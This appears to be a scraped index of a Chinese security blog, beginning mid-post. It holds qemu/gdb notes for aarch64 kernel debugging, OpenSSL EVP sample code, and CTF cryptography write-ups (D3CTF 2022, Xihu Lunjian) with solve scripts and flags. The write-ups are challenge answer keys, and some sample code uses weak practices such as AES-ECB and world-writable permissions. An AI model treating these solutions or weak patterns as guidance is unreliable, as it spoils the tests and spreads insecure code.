sysroot\u0026#34;? Breakpoint 1, 0x0000005500000928 in main () ------- tip of the day (disable with set show-tips off) ------- Want to NOP some instructions? Use patch \u0026lt;address\u0026gt; \u0026#39;nop; nop; nop\u0026#39; LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA ────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────── *X0 0x5500010000 ◂— 0x10102464c457f *X1 0x5502812568 —▸ 0x550281279f ◂— \u0026#39;./amd64out-lib\u0026#39; *X2 0x5502812578 —▸ 0x55028127ae ◂— \u0026#39;SUDO_GID=0\u0026#39; *X3 0x550000091c (main) ◂— stp x29, x30, [sp, #-0xe0]! X4 0x0 *X5 0xb25a824f20c39041 *X6 0x55029c8b10 ◂— 0x0 *X7 0x1 *X8 0xffffffffffffffff *X9 0xfffffff X10 0x0 X11 0x0 *X12 0x550285ce48 ◂— 0x0 X13 0x0 X14 0x0 *X15 0x6fffff47 *X16 0x1 *X17 0x5502879d28 ◂— 0xb0000a64a9ab7bfd *X18 0x73516240 *X19 0x55000009f8 (__libc_csu_init) ◂— stp x29, x30, [sp, #-0x40]! X20 0x0 *X21 0x5500000810 (_start) ◂— mov x29, #0 X22 0x0 X23 0x0 X24 0x0 X25 0x0 X26 0x0 X27 0x0 X28 0x0 *X29 0x5502812330 —▸ 0x5502812410 ◂— 0x0 *X30 0x5502879e10 ◂— 0xf9402fe0940055f4 *SP 0x5502812330 —▸ 0x5502812410 ◂— 0x0 *PC 0x5500000928 (main+12) ◂— ldr x0, [x0, #0xfe0] ─────────────────────[ DISASM / aarch64 / set emulate on ]───────────────────── ► 0x5500000928 \u0026lt;main+12\u0026gt; ldr x0, [x0, #0xfe0] 0x550000092c \u0026lt;main+16\u0026gt; ldr x1, [x0] 0x5500000930 \u0026lt;main+20\u0026gt; str x1, [sp, #0xd8] 0x5500000934 \u0026lt;main+24\u0026gt; mov x1, #0 0x5500000938 \u0026lt;main+28\u0026gt; adrp x0, #0x5500000000 0x550000093c \u0026lt;main+32\u0026gt; add x0, x0, #0xa98 0x5500000940 \u0026lt;main+36\u0026gt; bl #puts@plt \u0026lt;puts@plt\u0026gt; 0x5500000944 \u0026lt;main+40\u0026gt; add x0, sp, #0x10 0x5500000948 \u0026lt;main+44\u0026gt; mov x1, x0 0x550000094c \u0026lt;main+48\u0026gt; adrp x0, #0x5500000000 0x5500000950 \u0026lt;main+52\u0026gt; add x0, x0, #0xab8 ───────────────────────────────────[ STACK ]─────────────────────────────────── 00:0000│ x29 sp 0x5502812330 —▸ 0x5502812410 ◂— 0x0 01:0008│ 0x5502812338 —▸ 0x5502879e10 ◂— 0xf9402fe0940055f4 02:0010│ 0x5502812340 ◂— 0x0 03:0018│ 0x5502812348 ◂— 0xffffffff 04:0020│ 0x5502812350 ◂— 0x0 05:0028│ 0x5502812358 —▸ 0x55028678b8 ◂— 0xc001200005b6e /* \u0026#39;n[\u0026#39; */ 06:0030│ 0x5502812360 —▸ 0x5502846a00 —▸ 0x5502859000 ◂— 0x3010102464c457f 07:0038│ 0x5502812368 ◂— 0x0 ─────────────────────────────────[ BACKTRACE ]───────────────────────────────── ► 0 0x5500000928 main+12 ─────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; 按 n 单步开调\n调试动态链接文件 # 不添加 -static 编译\naarch64-linux-gnu-gcc ./main.c -o amd64out-lib\n此时需要 -L 指定 /libs 目录的位置\n#!/bin/bash sudo /usr/local/test/bin/qemu-aarch64 \\ -L /usr/aarch64-linux-gnu/ \\ ./amd64out-lib ljahum@ljahum-vm ~/D/test\u0026gt; sudo ./qemurun.sh hello world input ur emotion hello u say : hello you good 系统模式 # TO DO\n模拟运行ARM64架构内核 # 本来想做个aarch64跑系统模式 没想到翻到了内核的文章\nhttps://blog.csdn.net/weixin_39541632/category_9432131.html\n容易出错的点：\n挂载 # $ mkdir -p tmpfs $ sudo mount -t ext4 linux_rootfs.ext4 tmpfs/ -o loop $ sudo cp -af linux_rootfs/* tmpfs/ $ sudo umount tmpfs $ sudo chmod 777 linux_rootfs.ext4 挂载拷贝在 /root 下进行\nqemu aarch64启动命令写到 run.sh里面 给予权限后运行\nsudo chmod 777 ./* sudo ./run.sh 用户名默认root 交叉编译 strace 并安装 # 在root下clone strace\nroot@ljahum-vm:~# ls ./strace/ aclocal.m4 config.status LGPL-2.1-or-later README-hacking attic configure m4 README.md AUTHORS configure.ac maint src autom4te.cache COPYING Makefile strace.spec bootstrap CREDITS.in Makefile.am strace.spec.in build-aux debian Makefile.in strace.svg bundled dist NEWS tests ChangeLog-CVS doc README tests-m32 ci INSTALL README-configure tests-mx32 config.log INSTALL-git.md README-github_gitlab-autogenerated-archives.txt tmp.sh root@ljahum-vm:~# pwd /root root@ljahum-vm:~# 在/root 下解压gdb\n解压gdb8的命令\n在make前的\n./configure --host=aarch64-linux-gnu --target=aarch64-linux-gnu --program-prefix=aarch64-linux- \\ --prefix=/home/jiaming/Documents/jailhouse-rpi4/qemu-arm64/gdb-8.0/gdb-build 可以把\u0026ndash;prefix后面的目标目录换成自己user的目录\nmake error # 如果make install出现了\nhttps://blog.csdn.net/weixin_44602409/article/details/115716913\n的bug1\n修改以下文件\nroot@ljahum-vm:~/gdb-8.0# ls -l ./gdb/nat/linux-ptrace.* -rw-rw-rw- 1 ljahum 200 18011 8月 10 22:58 ./gdb/nat/linux-ptrace.c -rw-rw-rw- 1 ljahum 200 7709 8月 10 22:59 ./gdb/nat/linux-ptrace.h root@ljahum-vm:~/gdb-8.0# pwd /root/gdb-8.0 root@ljahum-vm:~/gdb-8.0# linux-ptrace.c\n注释掉\nlinux-ptrace.h\n加入\n重新make -j8\n再make install\nmakeinfo not found # sudo apt-get install texinfo\nmakeinfo没有安装的错误\n运行 # 编写gdb启动脚本\n编写qemu启动脚本\nroot@ljahum-vm:~# vim rungdb.sh root@ljahum-vm:~# vim dbgscript root@ljahum-vm:~# chmod 777 ./* root@ljahum-vm:~# cat run rungdb.sh run.sh root@ljahum-vm:~# cat rungdb.sh #!/bin/bash aarch64-linux-gdb ./linux-4.14.221/vmlinux -x dbgscript root@ljahum-vm:~# cat dbgscript target remote localhost:1234 root@ljahum-vm:~# cat run rungdb.sh run.sh root@ljahum-vm:~# cat run rungdb.sh run.sh root@ljahum-vm:~# cat run.sh /usr/local/test/bin/qemu-system-aarch64 \\ -m 1024 \\ -cpu cortex-a57 \\ -M virt -nographic \\ -smp 4 \\ -kernel linux-4.14.221/arch/arm64/boot/Image \\ -append \u0026#34;noinintrd sched_debug root=/dev/vda rootfstype=ext4 rw crashkernel=256M loglevel=8\u0026#34; \\ -drive if=none,file=linux_rootfs.ext4,id=hd0 \\ -device virtio-blk-device,drive=hd0 \\ -S -s root@ljahum-vm:~# 先运行qemu再运行gdb\n看起来非常上流\n会看镜像的成色\n完全符合我对Cortex-A57芯片的想象\nroot@lja-PC:~# lscpu Architecture: aarch64 Byte Order: Little Endian CPU(s): 4 On-line CPU(s) list: 0-3 Thread(s) per core: 1 Core(s) per socket: 4 Socket(s): 1 NUMA node(s): 1 Vendor ID: ARM Model: 0 Model name: Cortex-A57 Stepping: r1p0 BogoMIPS: 125.00 NUMA node0 CPU(s): 0-3 Flags: fp asimd evtstrm aes pmull sha1 sha2 crc32 cpuid root@lja-PC:~# ifconfig enp0s1: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 ether 52:54:00:12:34:56 txqueuelen 1000 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 2088 bytes 204552 (199.7 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2088 bytes 204552 (199.7 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 root@lja-PC:~# 可以给网卡配置和虚拟机同网段的ip来传文件（但看起来不需要）\n","date":"9 August 2023","permalink":"/articles/qemu021/","section":"Projects","summary":"算是了却了大二入门kernel pwn未果的心结","title":"qemu from zero 2 hero"},{"content":"","date":"30 July 2023","permalink":"/categories/2023/","section":"Categories","summary":"","title":"2023"},{"content":"","date":"30 July 2023","permalink":"/tags/development/","section":"Tags","summary":"","title":"Development"},{"content":"\rabout # 123123 id：ljahum\r@Syclover\n随缘排序\n如果你喜欢嘉然,哪我们就是异父异母的好兄弟\nprint(代码测试) \\(123123\\)\n$123$\n$$ 123123 $$\nIntroduction (TL;DR) # Authenticated encryption (AE) is a term used to describe encryption systems that simultaneously protect confidentiality and authenticity (integrity) of communications; that is, AE provides both message encryption and message authentication of a plaintext block or message .\nThe offset codebook block cipher mode (OCB)\nOCB provide an extremely efficient algorithm, equal to or more efficient than other AE algorithms. OCB is a cipher mode and we can apply ocb to AES/DES/SM4 etc.\nThe following paragraph briefly introduces OCB1 and OCB2\nOCB1 # Figure 1 shows the overall structure for OCB encryption and authentication.\nThe message M to be encrypted and authenticated is divided into n-bit blocks, with the exception of the last block, which may be less than n bits. Typically, n = 128.\nenc\nInput:$(N,M)$\nOutput:$(C,T)$\n\\(123123\\)\n$$ sdfasdfasd $$\n一个船新的站\n% KaTeX block notation $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$\n% KaTeX inline notation Inline notation: \\(\\varphi = \\dfrac{1+\\sqrt5}{2}= 1.6180339887…\\)\n","date":"30 July 2023","permalink":"/articles/cntest/","section":"Projects","summary":"about # 123123 id：ljahum\r@Syclover","title":"中文测试 中文測試 Chinese test"},{"content":"\rInfo # 「以前の名前はljahumですが、ベーコンとも呼んでください。」\nLinux Binary \u0026amp;\u0026amp; Development Cryptography\nlearning Cryptography is too hard（people vegetable addiction big）\ndream job: guitar player with financial freedom\ncontact me:\n1695325350 roomoflja@gmail.com ","date":"20 July 2023","permalink":"/about/","section":"","summary":"Info # 「以前の名前はljahumですが、ベーコンとも呼んでください。」","title":"About"},{"content":"","date":"20 July 2023","permalink":"/categories/categories1/","section":"Categories","summary":"","title":"categories1"},{"content":"This section contains all I wrote in 2019-2023\n","date":"15 February 2023","permalink":"/achieve/","section":"archive","summary":"This section contains all I wrote in 2019-2023","title":"archive"},{"content":"","date":"15 February 2023","permalink":"/tags/codes/","section":"Tags","summary":"","title":"codes"},{"content":"\r简介 # EVP系列的函数的声明包含在evp.h里面 封装了openssl加密库里面所有算法的函数。通过这样的统一的封装，使得只需要在初始化参数的时候做很少的改变，就可以使用相同的代码调用不同的加密算法\nctx上下文可以被认为是配置选项生效的“范围”。\n加载提供者时，它仅在给定库上下文的范围内加载。\n通过这种方式，复杂应用程序的不同组件可以各自使用不同的库上下文，并让不同的提供程序加载不同的配置设置。\n主要模块\n摘要 EVP_MD\n对称密码 EVP_CIPHER\n消息验证码 EVP_MAC\n密钥派生函数 EVP_KDF\n密钥交换 EVP_KEYEXCH\n非对称密码 EVP_ASYM_CIPHER\n公钥密码(相比对称强调秘钥和算法) EVP_PKEY_CTX\n非对称密钥封装 EVP_KEM\n编码 OSSL_ENCODER\nopenssl安装 # scoop install openssl 查看环境变量\nget-ChildItem env: ... OPENSSL_CONF D:\\Scoop\\apps\\openssl\\current\\bin\\cnf\\openssl.cnf OPENSSL_INCLUDE_DIR D:\\Scoop\\apps\\openssl\\current\\include OPENSSL_LIB_DIR D:\\Scoop\\apps\\openssl\\current\\lib OPENSSL_MODULES D:\\Scoop\\apps\\openssl\\current\\bin makefile配置(clion)\n#cmake_minimum_required(VERSION 3.24) cmake_minimum_required(VERSION 3.17) project(openssl1 C) set(CMAKE_C_STANDARD 99) set(LINK_DIR $ENV{OPENSSL_LIB_DIR}) set(INC_DIR \u0026#34;D:\\\\Scoop\\\\apps\\\\openssl\\\\current\\\\include\u0026#34;) # 手动配路径的方法 #include_directories($ENV{OPENSSL_INCLUDE_DIR}) 从系统读路径的方法 include_directories(${INC_DIR}) #link_directories($ENV{OPENSSL_LIB_DIR}) link_directories(${LINK_DIR}) link_libraries(openssl libcrypto) add_executable(openssl1 publicKeyEnc.c)#这里add的文件只能有一个main target_link_libraries(openssl1 openssl) openssl evp 摘要算法 # new一个md ctx ctx初始化 指定摘要类型的初始化 对消息多次摘要 摘要结束 输出结果 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026#34;openssl/evp.h\u0026#34; void test_md5(unsigned char * msg,unsigned char * output){ printf(\u0026#34;start test MD digest\\n\u0026#34;); char * msg1 = msg; unsigned char md_value[EVP_MAX_MD_SIZE]; unsigned int md_len; EVP_MD_CTX *pmdctx = EVP_MD_CTX_new(); EVP_MD_CTX_init(pmdctx); EVP_DigestInit(pmdctx,EVP_md5()); //该函数功能跟EVP_DigestInit_ex函数同样，可是ctx?数能够不用初始化，并且该函数仅仅使用缺省实现的算法。 EVP_DigestUpdate(pmdctx,msg1, strlen(msg1)); EVP_DigestFinal(pmdctx,md_value,\u0026amp;md_len); md_value[md_len]= (unsigned char) \u0026#39;\\0\u0026#39;;//加0截断 //返回参数 strcpy(output,md_value); output[strlen(md_value)] = (unsigned char) \u0026#39;\\0\u0026#39;; EVP_MD_CTX_free(pmdctx); //该函数功能跟EVP_DigestFinal_ex函数同样，可是ctx结构会自己主动清除。一般来说，如今新的程序应该使用EVP_DigestInit_ex和EVP_DigestFinal_ex函数 } void test_sm3(){ printf(\u0026#34;start test SM3 digest\\n\u0026#34;); unsigned char md_value[EVP_MAX_MD_SIZE]; //保存输出的摘要值的数组 unsigned int md_len; EVP_MD_CTX *pmdctx = EVP_MD_CTX_new(); //EVP消息结构体 char msg1[] = \u0026#34;Test Message1\u0026#34;; //待计算摘要的消息1 char msg2[] = \u0026#34;Test Message2\u0026#34;; //待计算只要的消息2 int i=0; EVP_MD_CTX_init(pmdctx); //初始化摘要结构体 //设置摘要算法和密码算法引擎，这里密码算法使用SM3 //算法引擎使用OpenSSL默认引擎，即软算法 EVP_DigestInit_ex(pmdctx,EVP_sm3(),NULL); EVP_DigestUpdate(pmdctx,msg1,strlen(msg1)); //调用摘要Update计算msg1的摘要 EVP_DigestUpdate(pmdctx,msg2,strlen(msg2)); //调用摘要Update计算msg2的摘要 EVP_DigestFinal_ex(pmdctx,md_value,\u0026amp;md_len); //摘要结束，输出摘要值 /* 打印结果 */ printf(\u0026#34;msgis: %s %s：\\n\u0026#34;,msg1,msg2); for(i=0;i\u0026lt;md_len;i++) { printf(\u0026#34;%02X\u0026#34;,md_value[i]); } printf(\u0026#34;\\n\u0026#34;); EVP_MD_CTX_free(pmdctx); } int main() { printf(\u0026#34;Hello, OpenSSL!\\n\u0026#34;); /* 加载所有算法 */ // OpenSSL_add_all_algorithms(); test_sm3(); //MD5 unsigned char msg1[] = \u0026#34;hello world\u0026#34;; unsigned char * output; test_md5(msg1,output); printf(\u0026#34;MD5(\\\u0026#34;%s\\\u0026#34;)=\u0026#34;,msg1); for (int i = 0; i \u0026lt; strlen(output); ++i) { printf(\u0026#34;%02X\u0026#34;,output[i]); } return 0; } openssl RSA密钥对生成模板 # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;openssl/evp.h\u0026gt; #include \u0026#34;openssl/rsa.h\u0026#34; void Test_Rsa(){ /*1.new一个公钥ctx对象 指定加密算法类型 * 2.对其初始化 * 3.设置rsa参数 * 4.正式生成密钥 * 5.释放ctx * */ printf(\u0026#34;hello RSA\\n\u0026#34;); EVP_PKEY * Rsa_Pkey=NULL; EVP_PKEY_CTX *Rsa_ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA,NULL); EVP_PKEY_keygen_init(Rsa_ctx); //前两步均在初始化 （不能合到一起吗） //EVP_PKEY_CTX_new() 函数使用pkey密钥类型和 ENGINE e分配公钥算法上下文。 // //EVP_PKEY_CTX_new_id() 函数使用id和 ENGINE e指定的密钥类型分配公钥算法上下文 EVP_PKEY_CTX_set_rsa_keygen_bits(Rsa_ctx,1024); EVP_PKEY_keygen(Rsa_ctx,\u0026amp;Rsa_Pkey); EVP_PKEY_CTX_free(Rsa_ctx); BIGNUM *d=0; // BIGNUM *e=0; // BIGNUM *n=0; EVP_PKEY_get_bn_param(Rsa_Pkey,\u0026#34;d\u0026#34;,\u0026amp;d); // EVP_PKEY_get_bn_param(Rsa_Pkey,\u0026#34;e\u0026#34;,\u0026amp;e); // EVP_PKEY_get_bn_param(Rsa_Pkey,\u0026#34;n\u0026#34;,\u0026amp;n); char *Hex_d; Hex_d = BN_bn2hex(d);//大数转化为十六进制字符串 // BN_bn2dec() 十进制 printf(\u0026#34; rsa私钥长度=%dbits 私钥十六进制形式:\\n\u0026#34;,strlen(Hex_d)*4); printf(\u0026#34;\\n\u0026#34;); for (int i = 0; i \u0026lt; strlen(Hex_d); ++i) { printf(\u0026#34;%C\u0026#34;,Hex_d[i]); } printf(\u0026#34;\\n\u0026#34;); EVP_PKEY_CTX_free(Rsa_ctx); //释放ctx } int main(){ Test_Rsa(); return 0; } openssl 对称密码模板 aesecb # // // Created by 16953 on 2023/2/14. // #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;openssl/evp.h\u0026gt; #include \u0026lt;openssl/aes.h\u0026gt; int main(void) { /* * 1. new aesctx * 2.initex * 3.update * 4.final * 5.free * */ unsigned char key[32] = {1}; unsigned char iv[16] = {0}; unsigned char *inStr = \u0026#34;this is test string\u0026#34;; int inLen = strlen(inStr); int encLen = 0; int outlen = 0; unsigned char encData[1024]; printf(\u0026#34;source: %s\\n\u0026#34;,inStr); //加密 EVP_CIPHER_CTX *ctx= EVP_CIPHER_CTX_new(); // ctx = EVP_CIPHER_CTX_new(); EVP_CipherInit_ex(ctx, EVP_aes_256_ecb(), NULL, key, iv, 1); EVP_CipherUpdate(ctx, encData, \u0026amp;outlen, inStr, inLen); encLen = outlen; EVP_CipherFinal(ctx, encData+outlen, \u0026amp;outlen); encLen += outlen; EVP_CIPHER_CTX_free(ctx); //解密 int decLen = 0; outlen = 0; unsigned char decData[1024]; EVP_CIPHER_CTX *ctx2= EVP_CIPHER_CTX_new(); EVP_CipherInit_ex(ctx2, EVP_aes_256_ecb(), NULL, key, iv, 0); EVP_CipherUpdate(ctx2, decData, \u0026amp;outlen, encData, encLen); decLen = outlen; EVP_CipherFinal(ctx2, decData+outlen, \u0026amp;outlen); decLen += outlen; EVP_CIPHER_CTX_free(ctx2); decData[decLen] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;decrypt: %s\\n\u0026#34;,decData); } EVP_对底层接口进行了封装,但对初学者和对密码体系了解不到位的同学来说会比直接调用低级接口抽象许多\n在调用细节上加强对资源销毁(EVP_FREE)的重视\n","date":"15 February 2023","permalink":"/achieve/openssl_evp/","section":"archive","summary":"","title":"OpenSSL 调用EVP框架 几种加密模式"},{"content":"","date":"11 February 2023","permalink":"/tags/nuil/","section":"Tags","summary":"","title":"Nuil"},{"content":"","date":"11 February 2023","permalink":"/categories/%E5%85%B6%E4%BB%96/","section":"Categories","summary":"","title":"其他"},{"content":" 花了一下午看题,解数较多的三个题难度比较签到\n尽一点绵薄之力\nd3factor # 查论文搞出一个有限域多项式\n构造好a后用sage自带的smallroot就能求出来，其中出现了一个灵异事件，自己的电脑求各种LLL会直接 暴毙，用官方在线sage搞到了数据\n对结果处理，得到p的六次方\n#! /usr/bin/sage from hashlib import md5 import gmpy2 from sage.all import * from sage.groups.generic import bsgs from Crypto.Util.number import * # N = 1476751427633071977599571983301151063258376731102955975364111147037204614220376883752032253407881568290520059515340434632858734689439268479399482315506043425541162646523388437842149125178447800616137044219916586942207838674001004007237861470176454543718752182312318068466051713087927370670177514666860822341380494154077020472814706123209865769048722380888175401791873273850281384147394075054950169002165357490796510950852631287689747360436384163758289159710264469722036320819123313773301072777844457895388797742631541101152819089150281489897683508400098693808473542212963868834485233858128220055727804326451310080791 # e1 = 425735006018518321920113858371691046233291394270779139216531379266829453665704656868245884309574741300746121946724344532456337490492263690989727904837374279175606623404025598533405400677329916633307585813849635071097268989906426771864410852556381279117588496262787146588414873723983855041415476840445850171457530977221981125006107741100779529209163446405585696682186452013669643507275620439492021019544922913941472624874102604249376990616323884331293660116156782891935217575308895791623826306100692059131945495084654854521834016181452508329430102813663713333608459898915361745215871305547069325129687311358338082029 # e2 = 1004512650658647383814190582513307789549094672255033373245432814519573537648997991452158231923692387604945039180687417026069655569594454408690445879849410118502279459189421806132654131287284719070037134752526923855821229397612868419416851456578505341237256609343187666849045678291935806441844686439591365338539029504178066823886051731466788474438373839803448380498800384597878814991008672054436093542513518012957106825842251155935855375353004898840663429274565622024673235081082222394015174831078190299524112112571718817712276118850981261489528540025810396786605197437842655180663611669918785635193552649262904644919 # a = (e2-e1)*inverse_mod(e1*e2,N) # PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(N)) # f=x-a # x0 = f.small_roots(X=2^1000, beta=0.4) # x0 = 1476751427633071977599571983301151063258376731102955975364111147037204614220376883752032253407881568290520059515340434632858734689439268479399482315506043425541162646523388437842149125178447800616137044219916586942207838674001004007237861470176454543718752182312318068466051713087927370670177514666860822341380494148050832401609562069841131611670608508889564903156115171543356434938854665775998209034026454583918190592316542096833683522232732078346945883792128428219017665904611238598515356080299964332522186719141840239751107772675611703424971072329706974374008179321418610378586680426547416872428073384036373775613 # print(x0) # ans = f(x0) # p = gcd(ans,N) # print(p) # print(isPrime(p)) # p = 302041005420039804788837973713898327221537364540217123524277085489425015387406302827931741511110799839253993542589980437030294737549654496720894473925249726898113670841165053274897225331487693822448903890664321018179858685020471572484115220669783927170647297629616743131628132318835058700355916820746650505209238111625956099990183829787016000154371928717007922683297772484179270642107118214144502646097942422343431687478702790785714060858198343943546186776012201 # print(gmpy2.iroot(p,int(6))) p = 81911394167511996830305370213894554209992159667974516868378702592733037962549 q = N//(p**7) q = 59689394622751323780317475130818337618980301243859922297121750335804594909859 c = 2420624631315473673388732074340410215657378096737020976722603529598864338532404224879219059105950005655100728361198499550862405660043591919681568611707967 e = 0x10001 N = p*q phi = (p-1)*(q-1) d = inverse(e,phi) m = pow(c,d,N) msg = long_to_bytes(m) print(msg) flag = \u0026#39;d3ctf{\u0026#39;+md5(msg).hexdigest()+\u0026#39;}\u0026#39; print(flag) flag d3ctf{42f79e777e622aef5344b04ad6233130}\nd3bug # 线性代数问题，把$r0 \u0026hellip;. r63$留在等号左边，已知量r64~r98移到等号右边\n得到关于r0~r63的70组方程\n构造矩阵发现矩阵的秩刚好为64，求最简矩阵去掉线性相关的向刚好得到r0~r63的值\n求等号左边的代码：\nmask = \u0026#39;1010010000001000000010001001010010100100000010000000100010010100\u0026#39; mask = [int(i) for i in mask ] r1 = \u0026#39;01111101111010111000010010111001101\u0026#39; r2 = \u0026#39;00100110001000110001101010101001001\u0026#39; r1 = [int(i) for i in r1] r2 = [int(i) for i in r2] x1 = [0 for i in range(35)] for i in range(35): A = r1[i] B = 0 # print(\u0026#39;i\u0026#39;,i) for j in range(1,i+1): B^=(r1[i-j]\u0026amp;mask[64-j]) x = A^B x1[i]=x # ============================================ print(r2) x2 = [0 for i in range(35)] for i in range(35): A = r2[i] B = 0 print(\u0026#39;i\u0026#39;,i) for j in range(1,i+1): print(i-j) B^=r2[i-j] # print(A,B) x = A ^ B # print(\u0026#39;x\u0026#39;,x) # input() x2[i]=x print(\u0026#39;x1=\u0026#39;,x1) print(\u0026#39;x2=\u0026#39;,x2) # x1= [1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0] # x2= [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1] 构造矩阵以及求最简矩阵的代码\n#! /usr/bin/sage from sage.all import * from sage.groups.generic import bsgs from Crypto.Util.number import * mask = \u0026#39;1010010000001000000010001001010010100100000010000000100010010100\u0026#39; mask = [int(i) for i in mask ] # mask = [i for i in range(len( mask) )] # M=0 # for i in mask: # M^=i # print(M) m=0 x1= [0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1] x2= [0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0] r1=x1 r2=x2 print(len(r1),len(r2)) matrix1 = [[0 for i in range(65)] for i in range(70)] for i in range(35): for j in range(i,64): matrix1[i][j]=mask[j-i] matrix1[i][64]=r1[i] for i in range(35,70): for j in range(i-35,64): matrix1[i][j]=1 matrix1[i][64]=r2[i-35] # print(matrix1) M = matrix1 F = GF(2) M1 = Matrix(F,M) M1 = M1.rref() print(M1.rank()) M2 = M1[:64,:-1] ans = M1[:64,64:] print(M2) print(ans) flag=\u0026#39;\u0026#39; for i in ans: print(i[0]) flag += str(i[0]) print(flag) l2b得到flag\nflag D3CTF{LF5Rsuk!}\n","date":"8 March 2022","permalink":"/achieve/ctf/d3ctf2022/","section":"archive","summary":"","title":"d3ctf2022🧀🧀🧀"},{"content":" 依旧是神仙打架的PY大赛\n题的质量也一般，是为了拖时间拉长战线出的题，嘛，大伙有钱赚就行，\n这点预算还想要原创？\n笑喜了\n西湖论剑2021Crypto # 密码人集合 # 数独题,属实绷不住了,记一下已经有人出国这种题了以后不能出了🎄🎄🎄\nhardrsa # src\nfrom Crypto.Util.number import * import gmpy2 from secret import flag p = getPrime(512) q = getPrime(512) n = p**4*q e = 65537 phi = gmpy2.lcm(p - 1, q - 1) d = gmpy2.invert(e, phi) dp = d % (p - 1) m = bytes_to_long(flag) c = pow(m, e, n) print (\u0026#34;dp = \u0026#34; + str(dp)) print (\u0026#34;c = \u0026#34; + str(c)) y = 449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839 g = 2 x = 2019*p**2 + 2020*p**3 + 2021*p**4 c1 = pow(g, x, y) print( \u0026#34;c1 = \u0026#34; + str(c1)) # dp = 379476973158146550831004952747643994439940435656483772269013081580532539640189020020958796514224150837680366977747272291881285391919167077726836326564473 # c = 57248258945927387673579467348106118747034381190703777861409527336272914559699490353325906672956273559867941402281438670652710909532261303394045079629146156340801932254839021574139943933451924062888426726353230757284582863993227592703323133265180414382062132580526658205716218046366247653881764658891315592607194355733209493239611216193118424602510964102026998674323685134796018596817393268106583737153516632969041693280725297929277751136040546830230533898514659714717213371619853137272515967067008805521051613107141555788516894223654851277785393355178114230929014037436770678131148140398384394716456450269539065009396311996040422853740049508500540281488171285233445744799680022307180452210793913614131646875949698079917313572873073033804639877699884489290120302696697425 # c1 = 78100131461872285613426244322737502147219485108799130975202429638042859488136933783498210914335741940761656137516033926418975363734194661031678516857040723532055448695928820624094400481464950181126638456234669814982411270985650209245687765595483738876975572521276963149542659187680075917322308512163904423297381635532771690434016589132876171283596320435623376283425228536157726781524870348614983116408815088257609788517986810622505961538812889953185684256469540369809863103948326444090715161351198229163190130903661874631020304481842715086104243998808382859633753938512915886223513449238733721777977175430329717970940440862059204518224126792822912141479260791232312544748301412636222498841676742208390622353022668320809201312724936862167350709823581870722831329406359010293121019764160016316259432749291142448874259446854582307626758650151607770478334719317941727680935243820313144829826081955539778570565232935463201135110049861204432285060029237229518297291679114165265808862862827211193711159152992427133176177796045981572758903474465179346029811563765283254777813433339892058322013228964103304946743888213068397672540863260883314665492088793554775674610994639537263588276076992907735153702002001005383321442974097626786699895993544581572457476437853778794888945238622869401634353220344790419326516836146140706852577748364903349138246106379954647002557091131475669295997196484548199507335421499556985949139162639560622973283109342746186994609598854386966520638338999059 喜闻乐见的数学题+离散对数形式\n推下公式 用sage一把梭哈\nfrom Crypto.Util.number import * import sympy dp= 379476973158146550831004952747643994439940435656483772269013081580532539640189020020958796514224150837680366977747272291881285391919167077726836326564473 c = 